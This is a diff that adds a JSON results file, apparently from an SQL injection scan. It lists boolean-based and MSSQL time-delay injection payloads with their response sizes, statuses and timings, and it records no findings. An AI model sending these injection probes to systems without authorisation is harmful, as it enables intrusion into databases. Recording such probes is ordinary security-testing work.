@@ -1,0 +1,60 @@
+{
+  "boolean_probes": {
+    "numeric_and": {
+      "true_payload": "1 AND 1=1",
+      "false_payload": "1 AND 1=2",
+      "true_avg_bytes": 14,
+      "false_avg_bytes": 14,
+      "delta_bytes": 0,
+      "true_statuses": [
+        200
+      ],
+      "false_statuses": [
+        200
+      ]
+    },
+    "string_and": {
+      "true_payload": "1' AND '1'='1",
+      "false_payload": "1' AND '1'='2",
+      "true_avg_bytes": 14,
+      "false_avg_bytes": 14,
+      "delta_bytes": 0,
+      "true_statuses": [
+        200
+      ],
+      "false_statuses": [
+        200
+      ]
+    },
+    "numeric_or": {
+      "true_payload": "1 OR 1=1",
+      "false_payload": "1 OR 1=2",
+      "true_avg_bytes": 14,
+      "false_avg_bytes": 14,
+      "delta_bytes": 0,
+      "true_statuses": [
+        200
+      ],
+      "false_statuses": [
+        200
+      ]
+    }
+  },
+  "time_probes": {
+    "mssql_waitfor_3s": {
+      "payload": "1; WAITFOR DELAY '0:0:3'--",
+      "expected_delay_ms": 3000,
+      "baseline_avg_ms": 195.0,
+      "probe_avg_ms": 175.0,
+      "delta_ms": -20.0
+    },
+    "mssql_waitfor_inline": {
+      "payload": "1' WAITFOR DELAY '0:0:3'--",
+      "expected_delay_ms": 3000,
+      "baseline_avg_ms": 195.0,
+      "probe_avg_ms": 175.0,
+      "delta_ms": -21.0
+    }
+  },
+  "findings": []
+}
